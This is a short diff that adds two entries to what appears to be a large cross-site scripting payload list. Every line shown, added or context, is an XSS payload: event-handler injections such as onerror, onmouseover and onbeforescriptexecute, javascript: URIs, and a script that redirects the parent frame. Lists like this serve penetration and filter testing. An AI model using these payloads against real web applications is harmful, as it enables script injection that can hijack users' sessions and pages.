@@ -1165,3 +1165,5 @@ x”</title><img src%3dx onerror%3dconfirm(1)>
 <a href="javascript:_e({}, 'cvml', 'test-01-%27-alert(1)-%27');" target="_blank">test</a>
 javascript:_e({}, 'cvml', 'test-01-'-alert(1)-'');
 <p onbeforescriptexecute="alert(1)"><svg><script>\</p>
+<var onmouseover="prompt(1)">XSS</var>
+<script>parent.location.replace('javascript:alert(document.domain)')</script>
